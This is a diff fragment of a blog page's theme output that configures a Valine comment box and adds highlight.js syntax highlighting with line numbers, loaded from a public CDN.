+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1152,6 +1406,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
